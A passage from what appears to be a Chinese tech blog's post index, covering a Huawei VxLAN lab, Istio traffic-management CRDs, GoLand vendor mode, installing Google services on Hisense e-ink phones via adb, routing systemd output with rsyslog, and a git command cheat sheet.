Endpoints）是VXLAN网络的边缘设备，是VXLAN隧道的起点和终点，VXLAN对用户原始数据帧的封装和解封装均在VTEP上进行。\nVTEP是VXLAN网络中绝对的主角，VTEP既可以是一台独立的网络设备（比如华为的CloudEngine系列交换机），也可以是在服务器中的虚拟交换机。源服务器发出的原始数据帧，在VTEP上被封装成VXLAN格式的报文，并在IP网络中传递到另外一个VTEP上，并经过解封转还原出原始的数据帧，最后转发给目的服务器。\n什么是VXLAN VNI VNI（VXLAN Network Identifier，VXLAN 网络标识符），VNI是一种类似于VLAN ID的用户标识，一个VNI代表了一个租户，属于不同VNI的虚拟机之间不能直接进行二层通信。在VXLAN报文封装时，给VNI分配了24比特的长度空间，使其可以支持海量租户的隔离。\n二层VNI是普通的VNI，以1：1方式映射到广播域BD，实现VXLAN报文同子网的转发。 三层VNI和VPN实例进行关联，用于VXLAN报文跨子网的转发（三层VNI的工作详情将在另外一篇EVPN相关的文档中展开描述）。 VNI的出现，就是专门解决以太网数据帧中VLAN只占了12比特的空间，这使得VLAN的隔离能力在数据中心网络中力不从心的问题\n完成VxLAN网络架构 使用VxLAN完成192.168.100.1 和 192.168.100.2之间的互联互通。模拟器使用eNSP、Underlay网络使用OSPFv2、Overlay使用VxLAN。\neNSP中配置VxLAN 在eNSP中只有华为的CE设备（CloudEngine系列交换机）支持VxLAN\nSW1\nsystem-view\rsysname SW1\rvlan 10\rinterface GigabitEthernet0/0/1\rport link-type trunk\rport trunk allow-pass vlan all\rinterface GigabitEthernet0/0/2\rport link-type access\rport default vlan 10\rdis ip interface brief SW2\nsystem-view\rsysname SW2\rvlan 10\rinterface GigabitEthernet0/0/1\rport link-type trunk\rport trunk allow-pass vlan all\rinterface GigabitEthernet0/0/2\rport link-type access\rport default vlan 10\rdis ip interface brief CE1\nsystem-view\rsysname CE1\rbridge-domain 10\rinterface GE1/0/0\r# 因为CE设备默认关闭了端口\rundo shutdown\r# 将接口模式设置为2层模式\rinterface GE1/0/0.10 mode l2\r# 数据包的封装\r# 路由器上配置trunk的封装协议的命令\r# dot1q中继封装，10指的是vlan 10\rencapsulation dot1q vid 10\rcommit\rquit\r# 桥接域，连接两个不同的网段使用\rbridge-domain 10\rvxlan vni 10\rcommit\r# 将bg桥与端口关联\rinterface GE1/0/0.10\rbridge-domain 10\rcommit\r### interface GE1/0/1\r# 关闭默认交换口，二层设备无法配置IP地址\rundo portswitch\rundo shutdown\rip address 172.16.0.1 255.255.255.0\rcommit\r# 配置ospf\rinterface LoopBack0\rip address 1.1.1.1 255.255.255.255\rquit\rcommit\rospf router-id 1.1.1.1\rarea 0.0.0.0\rnetwork 0.0.0.0 255.255.255.255\rcommit\r# 创建VxLAN隧道\rinterface Nve1 # 创建逻辑接口NVE 1\rsource 1.1.1.1 # 配置源VTEP的IP地址（推荐使用Loopback接口的IP地址）\r## vni 10的头端复制列表为对端\rvni 10 head-end peer-list 2.2.2.2\rcommit\rCE2\nsystem-view\rsysname CE2\rinterface GE1/0/0\r# 因为CE设备默认关闭了端口\rundo shutdown\r# 将接口模式设置为2层模式\rinterface GE1/0/0.10 mode l2\r# 数据包的封装\r# 路由器上配置trunk的封装协议的命令\r# dot1q中继封装，10指的是vlan 10\rencapsulation dot1q vid 10\rcommit\rquit\r# 桥接域，连接两个不同的网段使用\rbridge-domain 10\rvxlan vni 10\rcommit\r# 将bg桥与端口关联\rinterface GE1/0/0.10\rbridge-domain 10\rcommit\r### interface GE1/0/1\r# 关闭默认交换口，二层设备无法配置IP地址\rundo portswitch\rundo shutdown\rip address 172.16.0.2 255.255.255.0\rcommit\r# 配置ospf\rinterface LoopBack0\rip address 2.2.2.2 255.255.255.255\rquit\rcommit\rospf router-id 2.2.2.2\rarea 0.0.0.0\rnetwork 0.0.0.0 255.255.255.255\rcommit\r# 创建VxLAN隧道\rinterface Nve1 # 创建逻辑接口NVE 1\rsource 2.2.2.2 # 配置源VTEP的IP地址（推荐使用Loopback接口的IP地址）\r## vni 10的头端复制列表为对端\rvni 10 head-end peer-list 1.1.1.1\rcommit\r实验文件\nvxlan.zip\nvtep_g1_0_0.pcapng\nvtep_g1_0_1.pcapng\nreference huawei_vxlan_guide\n","permalink":"https://www.oomkill.com/2021/01/experiment-vxlan/","summary":"","title":"网络实验 - VxLAN"},{"content":"　在服务治理中，流量管理是一个广泛的话题，一般情况下，常用的包括：\n动态修改服务访问的负载均衡策略，比如根据某个请求特征做会话保持； 同一个服务有多版本管理，将一部分流量切到某个版本上； 对服务进行保护，例如限制并发连接数、限制请求数、隔离故障服务实例等； 动态修改服务中的内容，或者模拟一个服务运行故障等。 在Istio中实现这些服务治理功能时无须修改任何应用的代码。较之微服务的SDK方式，Istio以一种更轻便、透明的方式向用户提供了这些功能。用户可以用自己喜欢的任意语言和框架进行开发，专注于自己的业务，完全不用嵌入任何治理逻辑。只要应用运行在Istio的基础设施上，就可以使用这些治理能力。\n总结Istio流量治理的目标：以基础设施的方式提供给用户非侵入的流量治理能力，用户只需关注自己的业务逻辑开发，无须关注服务访问管理。\nistio流量治理的核心组件Pilot 在istio1.8中，istio的分为 envoy （数据平面） 、istiod （控制平面） 、addons（管理插件） 及 istioctl （命令行工具，用于安装、配置、诊断分析等操作）组成。\nPilot是Istio控制平面流量管理的核心组件，管理和配置部署在Istio服务网格中的所有Envoy代理实例。\npilot-discovery为envoy sidecar提供服务发现，用于路由及流量的管理。通过kubernetes CRD资源获取网格的配置信息将其转换为xDS接口的标准数据格式后，通过gRPC分发至相关的envoy sidecar\nPilot组件包含工作在控制平面中的 pilot-discovery 和工作与数据平面的pilot-agent 与Envoy(istio-proxy)\npilot-discovery主要完成如下功能：\n从service registry中获取服务信息 从apiserver中获取配置信息。 将服务信息与配置信息适配为xDS接口的标准数据格式，通过xDS api完成配置分发。 pilot-agent 主要完成如下功能\n基于kubernetes apiserver为envoy初始化可用的boostrap配置文件并启动envoy。\n管理监控envoy的云兄状态及配置重载。\nenvoy\n每个sidecar中的envoy是由pilot-agent基于生产的bootstrap配置进行启动，并根据指定的pilot地址，通过xDS api动态获取配置。 sidecar形式的envoy通过流量拦截机制为应用程序实现入站和出站的代理功能。 Pilot的实现 在istio中的管理策略都是基于Kubernetes CRD的实现，其中有关于流量管理的CRD资源包括 VirtualService EnvoyFilter Gateway ServiceEntry Sidecar DestinationRule WorkloadEntry WorkloadGroup。reference istio-networking-crd-resouces\nVirtualServices：用于定义路由，可以理解为envoy的 listener =\u0026gt; filter =\u0026gt; route_config\nDestinationRule：用于定义集群，可以理解为envoy 的 cluster\nGateway：用于定义作用于istio-ingress-gateway\nServiceEntry：用于定义出站的路由，作用于istio-egress-gateway\nEnvoyFilter：为envoy添加过滤器或过滤器链。\nSidecar：用于定义运行在sidecar之上的envoy配置。\nVirtual Services和 Destination Rules是Istio流量路由功能的核心组件\nistio流量流程概要 在控制面会经过如下流程：\n（1）管理员通过命令行或者API创建流量规则； （2）Pilot将流量规则转换为Envoy的标准格式； （3）Pilot将规则下发给Envoy。 在数据面会经过如下流程：\n（1）Envoy拦截Pod上本地容器的Inbound流量和Outbound流量； （2）在流量经过Envoy时执行对应的流量规则，对流量进行治理。 路由规则 ：Virtual Services VirtualServices是istio用于在其运行平台Kubernetes定义的配置，用来影响流量的路由规则；其本质就是为集群中envoy提供路由配置的。\nVirtualServices名词解释 VirtualServices中一些流量路由定义的关键术语。\nServices：服务的唯一应用名称的单位，在Kubernetes之上 Services通常为Kubernetes Services资源。\nSource：在上文中，下游发起请求的客户端服务。\nHost：客户端请求服务时使用的地址\nService versions：service允许的不同版本的子集（通常为流量管理中的概念，如AB等）每个Service都有一个包含所有实例的默认版本。\nVirtualServices资源说明 VirtualServices中主要有这些配置用于配置流量的路由定义。 reference virtual services\nhosts：string[] 目标主机，可以是带有统配符的DNS Name或IP\ngateways：string[]，这些资源生效的网关和sidecar的名称。默认为名称空间级别，跨名称空间使用 \u0026lt;gateway namespace\u0026gt;/\u0026lt;gateway name\u0026gt;\nmesh 默认值，表示生效与网格内所有sidecar\n仅应用于Gateway，该字段设置为Gateway的名称。\n忽略此字段：将应用于网格内部所有的sidecar\nhttp： HTTP协议流量的路由规则表。\nmatch：[] 匹配的条件。一个列表内单项内容的条件具有AND，整个列表的条件为OR。 name： uri：匹配值区分大小写 exact: 精确匹配。 prefix：用于前缀匹配。 regex：基于正则表达式匹配。 method：HTTP方法，参数与uri相同。 \u0026hellip; route：[] 设置的http流量的转发规则 destination：请求转发到的唯一标识符。 host：允许平台及ServiceEntry的服务名称，Kubernetes中为短名称reviews.default.svc.cluster.local subset，在DestinationRule中定义的子集 port：可选，公开服务的端口 weight：转发流量的比例0-100 ，各目标的和应为100。 headers：操作头规则。 redirect：重定向规则 delegate：只能在Route和Redirect为空时设置，委托的VirtualServices 名称 rewrite：重写HTTP URI。 timeout：HTTP请求超时，默认禁用。 retries：HTTP请求重试策略。 fault：故障注入 mirror：流量镜像 mirrorPercentage：对应mirror的比例 headers：操作http头的规则 \u0026hellip; tcp：TCP流量的路由规则的有序列表\nexportTo：允许 VirtualServices 其他名称空间的sidecar与gateway使用。\nVirtualServices配置实例 基于HTTP header的请求，将请求为/ratings/v2/ 路径，并且请求头包含 end-user 值为jason 。\napiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: ratings-route spec: hosts: - ratings.prod.svc.cluster.local http: - match: - headers: end-user: exact: jason uri: prefix: \u0026quot;/ratings/v2/\u0026quot; ignoreUriCase: true # 是否区分大小写，仅exact和prefix生效。 route: - destination: host: ratings.prod.svc.cluster.local 委托其他virtualServices处理\napiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: bookinfo spec: hosts: - \u0026quot;bookinfo.com\u0026quot; gateways: - mygateway http: - match: - uri: prefix: \u0026quot;/productpage\u0026quot; delegate: name: productpage namespace: nsA - match: - uri: prefix: \u0026quot;/reviews\u0026quot; delegate: name: reviews namespace: nsB apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: productpage namespace: nsA spec: http: - match: - uri: prefix: \u0026quot;/productpage/v1/\u0026quot; route: - destination: host: productpage-v1.nsA.svc.cluster.local - route: - destination: host: productpage.nsA.svc.cluster.local --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews namespace: nsB spec: http: - route: - destination: host: reviews.nsB.svc.cluster.local 目标规则：DestinationRule DestinationRule定义在完成路由配置后应用于服务流量的策略，即如何将流量调度至集群内，可以理解为DestinationRule定义的是envoy中的cluster。应用的内容也是envoy中cluster段的配置，如负载均衡配置，sidecar连接值及离群检测。\nDestinationRule字段说明 host: 注册表中的服务名称，kubernetes平台中使用短名称 trafficPolicy：应用的流量策略。 loadBalancer：使用的负载均衡算法， simple ROUND_ROBIN LEAST_CONN RANDOM PASSTHROUGH connectionPool：一致性hash outlierDetection：离群值检测 consecutiveGatewayErrors：满足502 503 504 错误数弹出。 consecutive5xxErrors： 满足5xx错误数弹出。 interval：探测时间间隔 baseEjectionTime：最小逐出时间。主机被驱逐的时间等于baseEjectionTime * 退出次数。 maxEjectionPercent：最大驱逐比例，默认10%。 minHealthPercent：最少健康比例，默认为0% tls portLevelSettings subsets：[] 服务各个版本命名集。 name：子集的名称 labels：标签过滤器 trafficPolicy：子集流量策略，继承DestinationRule级别流量策略。 exportTo：跨名称空间使用。 DestinationRule配置实例 基于服务子集的配置\napiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: bookinfo-ratings spec: host: ratings.prod.svc.cluster.local trafficPolicy: loadBalancer: simple: LEAST_CONN subsets: - name: testversionv3 labels: version: v3 - name: testversionv2 labels: version: v2 trafficPolicy: loadBalancer: simple: ROUND_ROBIN 配置离群值\napiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews-cb-policy spec: host: reviews.prod.svc.cluster.local trafficPolicy: connectionPool: tcp: maxConnections: 100 http: http2MaxRequests: 1000 maxRequestsPerConnection: 10 outlierDetection: consecutiveErrors: 7 interval: 5m baseEjectionTime: 15m 集群网关入口：Gateway Istio还提供了一种配置模型 Istio Gateway。Gateway 与 KubernetesIngress 相比，Gateway有高度的定制化与灵活性，并且允许将Istio功能应用于集群流量入口。\nGateway中运行的程序为envoy，它从控制平面接收相应的配置，并完成相关流量的传输；Gateway资源只负责网络入口点的相关功能，具体的路由实现则由VirtualService完成。\nGateway 配置说明 Gateway定义了一个集群入口的负载均衡器，该负载均衡为运行在网格的边缘代理，负责将外部流量引入集群的内部。\nGateway资源生效于Ingress | Egress Envoy Pod的标签选择器，使用selector定义：selector: app=istio-ingressgateway。\napiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: study-gateway namespace: default spec: selector: # 基于名称空间中匹配pod的标签从而生效的应用 app: istio-ingressgateway # 标签可以是一个或多个 servers: # 描述对应的envoy的lintener的配置。 - port: # 设置envoy lintener number: 90 # 端口号 (Required) targetPort: # 可选 (Optional) name: envoy_end # 分配给端口的标签。 protocol: HTTP # 端口服务协议，HTTP|HTTPS|GRPC|HTTP2|MONGO|TCP|TLS hosts: [ \u0026quot;*\u0026quot; , \u0026quot;text.studyenvoy.com\u0026quot; ] # 设置dnsName 可选的名称空间，*|. tls: # 与TLS相关的选项集 (Optional) name: # 服务器的可选名称，必须唯一 (Optional) Gateway配置实例 基于istio Bookinfo示例的Gateway资源清单。\napiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: bookinfo-gateway spec: selector: istio: ingressgateway # use istio default controller servers: - port: number: 80 name: http protocol: HTTP hosts: - \u0026quot;*\u0026quot; 这里可以看到istio-ingress-gateway的pod的标签 app=istio-ingressgateway\n$ kubectl get pods -n istio-system --show-labels NAME READY STATUS RESTARTS AGE LABELS istio-ingressgateway-78b47bc88b-xqqpn 1/1 Running 0 22d app=istio-ingressgateway, chart=gateways, heritage=Tiller, install.operator.istio.io/owning-resource=unknown, istio.io/rev=default,istio=ingressgateway, operator.istio.io/component=IngressGateways, pod-template-hash=78b47bc88b, release=istio,service.istio.io/canonical-name=istio-ingressgateway, service.istio.io/canonical-revision=latest 外部服务引入配置：ServiceEntry 在Istio中提供了ServiceEntry，可将网格外的服务加入网格中，像网格内的服务一样进行管理。\n在实现上就是把外部服务加入 Istio 的服务发现，这些外部服务因为各种原因不能被直接注册到网格中。\nServiceEntry字段说明 host：与ServiceEntry关联的主机 addresses：与服务关联的虚拟IP地址。 ports： number：服务的端口。 protocol：服务公开的协议。HTTP|HTTPS|GRPC|HTTP2|MONGO|TCP| TLS之一。 targetPort：目标端口号。 location：MESH_EXTERNAL | MESH_INTERNAL，决定是网格内部还是外部。 resolution：服务发现机制。 NONE： STATIC：指定静态IP地址。 DNS：通过DNS发现。 endpoints：服务关联的端点，workloadSelector 与 endpoints 二选一。 exportTo：共享其他名称空间 subjectAltNames：如指定，将验证服务器证书的使用者备用名称是否与指定值之一匹配。 使用istio ingress gateway 配置一个网格外部的应用 部署应用程序 准备一个后端的应用\napiVersion: apps/v1 kind: Deployment metadata: name: httpend-deply namespace: kube-system labels: app: httpend-deply spec: replicas: 1 selector: matchLabels: app: httpend-deply template: metadata: namespace: kube-system name: httpend-deply labels: app: httpend-deply spec: containers: - name: envoy-end image: cylonchau/envoy-end imagePullPolicy: IfNotPresent livenessProbe: initialDelaySeconds: 3 # 首次探测延迟时间 periodSeconds: 2 # 定期重试 failureThreshold: 1 # 失败重试次数 httpGet: port: 90 path: ping restartPolicy: Always --- apiVersion: v1 kind: Service metadata: name: envoy-end labels: app: envoy-end namespace: kube-system spec: type: NodePort # nodeport是为了验证服务是否正常 ports: - port: 90 name: envoy-end targetPort: 90 nodePort: 30102 selector: app: httpend-deply 应用Gateway和VirtualServices\napiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: envoyend-gateway namespace: kube-system spec: selector: istio: ingressgateway servers: - port: number: 1090 name: http protocol: HTTP hosts: - \u0026quot;*\u0026quot; --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: envoy-end namespace: kube-system spec: hosts: - \u0026quot;*\u0026quot; gateways: - envoyend-gateway http: - match: - uri: prefix: / route: - destination: host: envoy-end port: number: 1090 应用DestinationRule\napiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: envoy-end namespace: kube-system spec: host: envoy-end trafficPolicy: loadBalancer: simple: ROUND_ROBIN 应用ServiceEntry\napiVersion: networking.istio.io/v1alpha3 kind: ServiceEntry metadata: name: envoy-end namespace: kube-system spec: hosts: - \u0026quot;envoy-end\u0026quot; ports: - number: 90 name: http protocol: HTTP location: MESH_EXTERNAL resolution: DNS ","permalink":"https://www.oomkill.com/2020/12/istio-introduction/","summary":"","title":"istio流量管理：非侵入式流量治理"},{"content":"goland使用vendor作为获取依赖源 软件版本：\nsystem：windows10 1709 terminal： wsl ubuntu1804 goland：201903 goland 打开项目时使用mod模式，无法识别外部包的依赖\n根据goland官方提示，开启时，将忽略go.mod依赖描述，所以就找不到相对应的依赖，但是编译时正常的。可以看到下图中，external libraries 并没有加载外部的库导致了无法识别。\n此时想要正常使用的话，可以按照提示操作\n将 goland 改为gopath模式，执行go mod vendor 将依赖同步到vendor 。此时正常。\n当依赖更新时，可以手动添加对应的依赖库，go mod tidy 后 。因为vendor中没有新的依赖，需要手动执行下go mod vendor即可正常使用。\n使用vendor编译 在编译时，可以使用 -mod=vendor 标记，使用代码主目录文件夹下vendor目录满足依赖获取，go build -mod=vendor。此时，go build 忽略go.mod 中的依赖，（这里仅使用代码root目录下的vendor其他地方的将忽略）\nGOFLAGS=-mod=vendor 设置顶级vendor作为依赖 go env -w GOFLAGS=\u0026quot;-mod=vendor\u0026quot; 进行设置。 取消 go env -w GOFLAGS=\u0026quot;-mod=\u0026quot;\n","permalink":"https://www.oomkill.com/2020/12/go-vendor-file-in-goland/","summary":"","title":"goland在mod模式下不从vendor文件夹查找依赖"},{"content":"用过海信双面屏或者eink手机的朋友都知道，海信手机就是死活安装不了谷歌全家桶，因为海信的领导说跟谷歌有协议不能安装谷歌框架（还说后期google审核坚决不给安装，人家其他ov mui都可以安装）。不信的朋友可以去海信论坛求证，杠精走开。\n海信手机没有安装GSM Google Mobile Service 也没有 youtube，gmail，google map。在国外的朋友们用起来很难受，别说打游戏了，就日常出行也离不开google service，也是找了很久找到一个国外大神对海信A7 Pro下安装的教程，尝试在A6l也可以装，后面 Hisense A5PRO/CC Hisense A7/CC A6/A6L A2/A2Pro 其实都是通用的。\n不过这个大神的教程并不是root来安装，对于在保的小伙伴们还是依然可以享受保修，系统升级（虽然海信基本百年不更新的），现在开始介绍下如何让海信eink系列获得GMS\n安装步骤 下载 adb 关闭一堆系統內建的 垃圾 Apps 的功能(可以不关闭看自己了) 下载 Aurora Store (这步骤完全没用上，看个人了，国外大神推荐要下载) 先依照順序 安裝 4个基础服务 apk，安装完成后可以正常登陆google账号了 再 按照顺序 安裝 3个 其他服务 apk（可以不按照顺序，国外大神说的是需要按照顺序） 前置步驟：开启开发者模式 打开 开发者模式\n步骤1：下载安装 adb 程序 Mac可以直接输入命令：brew install android-platform-tools 具体 brew 是啥自行百度\nWindows 平台参考：\n先从这里下载 adb，然后下一步，下一步就行，到安装完成。\n安装好后启动 adb，这里只介绍几个命令，对于装个 GAPPS 已经足够了。\n查看设备：adb devices 看到xxxxxx device即表示连接成功 查看手机IP: adb shell ifconfig wlan0 通过IP地址连接手机：adb connect \u0026lt;device-ip-address\u0026gt; 断开连接：adb disconnect \u0026lt;device-ip-address\u0026gt; 设备监听：adb tcpip 5555 这里差不多了，更多可以参考下这里，下面开始介绍如何连接手机\n首先打开开发者模式，用数据线连接电脑\n看到有设备的即使连接成功\n让设备在 5555 端口监听 TCP/IP 连接：\n这里需要手机和电脑处于一个网络中，没有的话，可以用手机分享个热点，或者电脑分享个热点手机连上即可。\nadb tcpip 5555 断开 USB 连接。\n通过ip连接上就可以断开了\n找到设备的 IP 地址。\n一般能在「设置」-「关于手机」-「状态信息」-「IP地址」找到，也可以使用命令查看\nadb shell ifconfig wlan0\nadb shell ifconfig wlan0 # 下面的inet addr就是IP地址 wlan0 Link encap:Ethernet HWaddr xx:xx:xx:xx:xx:xx inet addr:172.30.96.xx Bcast:172.30.111.xx Mask:255.255.240.xx inet6 addr: xx::xx:xx:xx:xx/xx Scope: Link UP BROADCAST RUNNING MULTICAST MTU:xxx Metric:1 RX packets:xxx errors:0 dropped:xxx overruns:0 frame:0 TX packets:xxx errors:xx dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:xxx RX bytes:xxx TX bytes:xxx 通过 IP 地址连接设备。\nadb connect \u0026lt;device-ip-address\u0026gt; # \u0026lt;device-ip-address\u0026gt; 就是上一步中找到的设备 IP 地址。 # 确认连接状态。 adb devices # \u0026lt;device-ip-address\u0026gt;:5555 device说明连接成功。 到这一步已经完成连接了。\n步骤2：删除海信手机里的垃圾软件（可选） 这里要么一个个复制执行，可以写个cmd文件 复制进去就行 扩展名 .cmd 执行文件\n这里其实关闭这些垃圾app可以减少很多内存，我全都关掉后，基本上比平时多400-500M的内存，可以替换为自己喜欢的第三方app\nadb shell pm disable-user --user 0 com.android.hplayer # 视频播放器 adb shell pm disable-user --user 0 com.android.browser # 默认的浏览器 adb shell pm disable-user --user 0 com.android.calendar # 日历 adb shell pm disable-user --user 0 com.android.firewall adb shell pm disable-user --user 0 com.android.providers.downloads.ui # 下载 adb shell pm disable-user --user 0 com.android.sos # sos其实没用 adb shell pm disable-user --user 0 com.hmct.account # 海信账号 adb shell pm disable-user --user 0 com.hmct.antivirus adb shell pm disable-user --user 0 com.hmct.assist #助手 adb shell pm disable-user --user 0 com.hmct.einklauncher.plugin.wechat # 墨水屏后部分的微信 adb shell pm disable-user --user 0 com.hmct.imageedit # 图片编辑 adb shell pm disable-user --user 0 com.hmct.mobileclear # 手机清理 adb shell pm disable-user --user 0 com.hmct.questionnaire # 海信售后 adb shell pm disable-user --user 0 com.hmct.theme #主题商城 adb shell pm disable-user --user 0 com.hmct.voiceassist # 语音助手 adb shell pm disable-user --user 0 com.hmct.voicetranslate # 语音转换 adb shell pm disable-user --user 0 com.hmct.music # 音乐 adb shell pm disable-user --user 0 com.hmct.hmctmanual # 海信的手册 adb shell pm disable-user --user 0 com.hmct.userexperienceprogram adb shell pm disable-user --user 0 com.tencent.soter.soterserver adb shell pm disable-user --user 0 org.hapjs.mockup adb shell pm disable-user --user 0 com.hmct.jdreader adb shell pm disable-user --user 0 com.tencent.android.location adb shell pm disable-user --user 0 com.hmct.hiphone.juplugin adb shell pm disable-user --user 0 com.hmct.ftmode adb shell pm disable-user --user 0 com.hmct.semantic.analysis adb shell pm disable-user --user 0 com.android.hmctconsumerservice #手机服务 adb shell pm disable-user --user 0 com.android.mobilemanager #手机管家 adb shell pm disable-user --user 0 com.android.hmctconsumerservice # 服务网点名录 adb shell pm disable-user --user 0 com.hmct.gamebox # 游戏盒子 adb shell pm disable-user --user 0 com.hmct.hiphone.juplugin # 咨询推荐 步骤3：下载极光商店和Lawnchair （可选） 手动下载也行，在手机上下也行，download from APKMirror\n使用以下命令通过ADB设置为默认lawnchair启动程序：\nadb shell cmd package set-home-activity \u0026quot;ch.deletescape.lawnchair.plah\u0026quot; # 完成后重启手机，我是没装这步骤 步骤4 安装GAPPS 首先下载所需的apk，这里直接贴上大神给的下载地址理论上 A7Pro/CC 可以直接用\n这是大佬的：\nhuawei-p40 huawei 这是我打包的包含A6l：HISENSE\n再次更新：阿里网盘也被限制了，直接CSDN吧：下载地址：HISENSE\n如果怕也可以自行下载，在搜索对应的软件名称www.apkmirror.com，看好版本号，如：Requires newer sdk version #29 (current version is #28)，这种就是属于安卓版本对不上。\n这种就属于安卓版本和软件版本不一致，如A6l是9 A7Pro是10，不能互通。 问题可以参考这里：https://github.com/rom1v/sndcpy/issues/37\nadb: failed to install sndcpy.apk: Failure [INSTALL_FAILED_OLDER_SDK: Failed parse during installPackageLI: /data/app/vmdl1606743385.tmp/base.apk (at Binary XML file line #7): Requires newer sdk version #29 (current version is #28)] 下面按照顺序依次安装完即可（也可以不按照顺序）\n001-Google Play services-com.google.android.gms-1…apk 002-Google_Account_Manager.apk 003-Google Play Store.apk 004-com.google.androi….apk （到这里不能正常使用google play store） 005-Google Services Framework-com.google.android.gsf-29-v10.apk 下面两个不用安装，安装出错 006-modagain1gsm.apk （安装新版01后无法安装后两个） 007-com.google.android.gms2.apk （安装新版01后无法安装后两个） 安装命令： 替换\u0026lt;package_name\u0026gt; 为上述的包名，注意路径。\nadb install \u0026lt;package_name\u0026gt; 安装完成后就可以正常使用google全家桶了。再也不怕出国不能打车了。\nReference\nInstall the GAPPS on HISENSE A7 / A7CC / A5PRO / A5PRO CC\nInstall and use ADB on HISENSE A5PRO / A5PRO CC\n","permalink":"https://www.oomkill.com/2020/11/hisense-a6l-gms-install/","summary":"","title":"海信A6/A6L A7Pro/CC A5PRO/A5PRO CC  安装gms google service指南"},{"content":"　有一种更优雅的方法可以解决systemd输出到指定文件而非/var/log/message，需要使用systemd参数与rsyslog过滤器。并指示syslog过滤器按程序名称拆分其输出。\nsystemd所需参数为 SyslogIdentifier：required，设置日志标识符(发送日志消息时加在行首的字符串)(\u0026ldquo;syslog tag\u0026rdquo;)。 默认值是进程的名称。此选项仅在 StandardOutput= 或 StandardError= 的值包含 journal(+console), syslog(+console), kmsg(+console) 之一时才有意义， 并且仅适用于输出到标准输出或标准错误的日志消息。 StandardOutput：required，设置进程的标准输出(STDOUT)。 可设为 inherit, null, tty, journal, syslog, kmsg, journal+console, syslog+console, kmsg+console, file:path, append:path, socket, fd:name 之一。 StandardError：设置进程的标准错误(STDERR)。 取值范围及含义与 StandardOutput= 相同。但有如下例外： (1) inherit 表示使用 StandardOutput= 的值。 (2) fd:name 的默认文件描述符名称为 \u0026ldquo;stderr\u0026rdquo; rsyslog过滤器设置 使用rsyslog条件选择器。如果不改变rsyslog目前工作模式，按照如下操作：\n新建/etc/rsyslog.d/xx.conf文件。\n在新建文件内写入内容如下\n单一条件处理。\nif $programname == 'programname' then /var/log/programname.log # 停止往其他文件内写入，如果不加此句，会继续往/var/log/message写入。 if $programname == 'programname' then stop 多条件处理\n会根据不同应用名称将不同的输出日志重定向到不同的文件内。\nif ($programname == 'apiserver') then { action(type=\u0026quot;omfile\u0026quot; file=\u0026quot;/var/log/apiserver.log\u0026quot;) stop } else if ($programname == 'scheduler') then { action(type=\u0026quot;omfile\u0026quot; file=\u0026quot;/var/log/scheduler.log\u0026quot;) stop } else if ($programname == 'controller-manager') then { action(type=\u0026quot;omfile\u0026quot; file=\u0026quot;/var/log/controller-manager.log\u0026quot;) stop } else if ($programname == 'etcd') then { action(type=\u0026quot;omfile\u0026quot; file=\u0026quot;/var/log/etcd.log\u0026quot;) stop } 检查语法是否正确 rsyslogd -N1 -f file_name.conf\n重新启动rsyslog\n完成以上步骤后，应用的 stdout stderr被重定向到对应的日志文件内了，而非/var/log/message，并且仍然可以通过通过journalctl获得对应的stdout stderr （systemd参数机制）。\nreference\nsystemd\nrsyslog-conditional\nrsyslog\n","permalink":"https://www.oomkill.com/2020/11/systemd-output/","summary":"","title":"如何将systemd服务的输出重定向到指定文件"},{"content":"Tag command describe git tag 列出所有tag git tag -l v1.* 列出符合条件的tag（筛选作用） git tag [tag_name] 创建轻量tag（无-m标注信息） git push REMOTE TAG 推送一个tag到远端 git push origin \u0026ndash;tags* 推送所有本地tag到远程 git push origin :refs/tags/[REMOTE TAG]\ngit push \u0026ndash;delete REMOTE TAG 删除远程指定tag git fetch origin [remote_tag_name] 拉取远程指定tag git show [tag_name] 显示指定tag详细信息 git push origin [local_tag_name] 推送指定本地tag到远程 git tag NEW_TAG OLD_TAG\ngit tag -d OLD_TAG 重命名本地tag git tag -d [local_tag_name] 删除本地指定tag git ls-remote \u0026ndash;tags origin 查询远程tags git tag -a [tag_name] 创建含注解的tag git fetch origin [remote_tag_name]git checkout [remote_tag_name] git branch checkout远端tag到本地 Checking 检查工作目录与暂存区的状态\ncommand describe git status 查看在你上次提交之后是否有对文件进行再次修改 git status -s 获得简短的输出结果 git diff 用于比较文件间差异 git diff \u0026ndash;cached git diff \u0026ndash;staged 显示暂存区(已add但未commit文件)和最后一次commit(HEAD)之间的所有不相同文件的增删改 git diff HEAD 工作目录(已track但未add文件)和暂存区(已add但未commit文件)与最后一次commit之间的的所有不相同文件的增删改 git diff \u0026lt;branch1\u0026gt; \u0026lt;branch2\u0026gt; 比较两个分支上最后 commit 的内容的差别 Log command describe git diff branch1 branch2 \u0026ndash;stat 显示出所有有差异的文件（无内容） git log \u0026lt;b1\u0026gt;..\u0026lt;b2\u0026gt; 查看 b1 中的 log 比 b2 中的 log 多提交了哪些内容 git log \u0026ndash;oneline 以 \u0026lt;commit_id\u0026gt; \u0026lt;comment\u0026gt; 为一行来显示 git log -S \u0026lt;\u0026lsquo;LoginViewController\u0026rsquo;\u0026gt; log 的输出将添加火删除对应字符串 git log \u0026ndash;all \u0026ndash;grep=\u0026lt;\u0026lsquo;0117\u0026rsquo;\u0026gt; log 的输出将过滤出与对应字符串相关的commit Checkout checkout 是指不同tag或分支间的切换行为\ncommand describe git checkout TAG 切换至一个tag git checkout -b BRANCH TAG 创建一个新分支，并切换至这个tag git checkout BRANCH 切换至一个分支 git checkout -m BRANCH 在切换分支时如有冲突则合并 git checkout COMMIT_HASH 切换至一个commit git checkout -b BRANCH HEAD~4 git checkout -b BRANCH COMMIT_HASH 切换并创建为新分支 git checkout COMMIT \u0026ndash; FILE_PATH 将 FILE_PATH 指定的文件恢复为当前分支的最新版本（仅未add） Remote remote 子命令用于管理repositories\ncommand describe git remote List all remote git remote rename OLD_REMOTE NEW_REMOTE Rename remote git remote prune REMOTE Remove stale remote tracking branches 